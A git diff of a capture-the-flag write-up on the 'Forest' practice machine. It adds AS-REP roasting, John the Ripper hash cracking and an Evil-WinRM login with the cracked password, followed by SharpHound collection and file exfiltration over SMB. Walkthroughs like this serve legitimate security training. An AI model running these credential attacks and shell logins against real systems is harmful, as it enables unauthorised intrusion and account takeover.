@@ -11,7 +11,7 @@ categories: [Practice]
 toc:  true
 ---
 
-Forest is an easy Windows box with a focus on Acdive Directory recon rather than exploitation.
+Forest is an easy Windows box with a focus on Active Directory recon rather than exploitation.
 
 ## Enumeration
 
@@ -135,7 +135,7 @@ Perfect! Now we have a clean user list to run against other tools.
 
 We can use this new user list with Impacket's `GetNPUsers.py` or `Impacket-GetNPUsers`. GetNPUsers exploits users without pre-authentication enabled, which would allow us to grab their account password hash.
 
-```
+```shell
 $ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 -usersfile cleanusers htb.local/
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
@@ -157,7 +157,7 @@ Unfortunately for Alfresco but fortunately for us, svc-alfresco does not have pr
 
 `John`, or otherwise known as `John the Ripper`, is a password brute force tool ot crack hashes and reveal their passwords. We can crack the hash from svc-alfresco with the following command:
 
-```
+```shell
 $ john alfresco_hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
@@ -166,3 +166,21 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
 
 ```
+
+### Shell
+
+Using Evil-WinRM we can use the credentials to log into a Windows Remote Management shell as the svc-alfresco user.
+
+```shell
+$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> echo 'im in'
+> im in
+```
+
+## Bloodhound
+I used Bloodhound to enumerate this machine and find relationships between the users and groups. To do this you must first upload SharpHound.exe to the remote machine through Evil-WinRM and collect all the information you can.
+
+![SharpHound](https://mitchelldstein.github.io/assets/images/Forest/SharpHound.png)
+
+To get the created json files off the machine, you can use Impacket-SmbServer and connect to it through Evil-WinRM.
